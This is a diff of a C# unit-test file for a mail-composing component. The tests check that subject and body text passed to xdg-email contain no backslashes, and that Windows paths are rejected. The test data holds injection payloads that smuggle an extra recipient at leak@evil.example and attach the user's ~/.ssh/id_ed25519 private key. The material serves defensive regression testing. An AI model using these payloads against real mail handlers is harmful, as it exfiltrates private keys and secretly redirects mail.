@@ -49,17 +49,27 @@ public sealed class OsMailComposerTests : IDisposable
     // xdg-email runs its values through dash's echo more than once, and each pass decodes
     // backslash escapes again: "\\0046to\\0075…" survives its URL encoding and comes out as
     // "&to=…", adding a recipient (or, for Thunderbird, a bcc='…') the Lagebuchführer never sees.
+    // Only subject and body: a path with a backslash never reaches xdg-email at all (see
+    // IsSafeForXdgEmail below), and on Windows every temp path has one.
     [Fact]
-    public void Xdg_email_never_receives_a_backslash()
+    public void Xdg_email_never_receives_a_backslash_in_subject_or_body()
     {
         var draft = new MailDraft(
             @"Einsatzbericht B3\\0046to\\0075leak@evil.example\\0046attach\\0075/home/lf/.ssh/id_ed25519",
             @"Anbei\\0054bcc\\0075\\0047leak@evil.example\\0047",
-            _pdf);
+            @"C:\Users\runneradmin\AppData\Local\Temp\bericht.pdf");
 
-        var args = OsMailComposer.BuildXdgEmailArguments(draft);
+        var args = OsMailComposer.BuildXdgEmailArguments(draft).ToList();
 
-        Assert.All(args, a => Assert.DoesNotContain('\\', a));
+        Assert.DoesNotContain('\\', args[args.IndexOf("--subject") + 1]);
+        Assert.DoesNotContain('\\', args[args.IndexOf("--body") + 1]);
+    }
+
+    [Fact]
+    public void A_path_with_a_backslash_is_not_safe_for_xdg_email()
+    {
+        Assert.False(OsMailComposer.IsSafeForXdgEmail(@"C:\Users\lf\bericht.pdf"));
+        Assert.True(OsMailComposer.IsSafeForXdgEmail("/home/lf/bericht.pdf"));
     }
 
     // run_thunderbird decodes the attach value with `echo -e` and splices it into
